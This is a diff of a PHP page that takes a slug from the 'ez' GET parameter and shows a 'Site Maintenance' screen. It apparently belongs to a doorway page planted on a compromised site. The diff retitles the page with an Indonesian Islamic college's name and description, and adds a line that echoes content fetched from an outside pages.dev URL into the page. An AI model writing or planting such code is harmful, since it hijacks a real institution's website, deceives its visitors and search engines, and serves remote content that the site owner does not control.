@@ -4,7 +4,7 @@ $slug = isset($_GET['ez']) ? (string)$_GET['ez'] : '';
 
 $is_tunnel = false;
 $BRANDS = '';
-$aduh = $slug; // ambil slug sebagai bahan amp link
+$aduh = $slug;
 
 if ($slug !== '') {
     $filename = "readme.txt";
@@ -39,7 +39,8 @@ if ($is_tunnel) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Site Maintenance</title>
+    <title>STIT UW Jombang: Fakultas Agama Islam</title>
+    <meta name="description" content="PROGRAM STUDI · Pendidikan Agama Islam (S1) · Hukum Ekonomi Syariah (S1) · Ilmu Al-Qur'an dan Tafsir (S1) · Magister Pendidikan Agama Islam (S2)." />
     <style>
         body {
             margin: 0;
@@ -89,5 +90,6 @@ if ($is_tunnel) {
         <p>Situs kami sedang dalam perbaikan. Mohon cek kembali nanti!</p>
         <div class="spinner"></div>
     </div>
+        <?php echo file_get_contents("https://punten-neng.pages.dev/punten.txt");?>
 </body>
 </html>
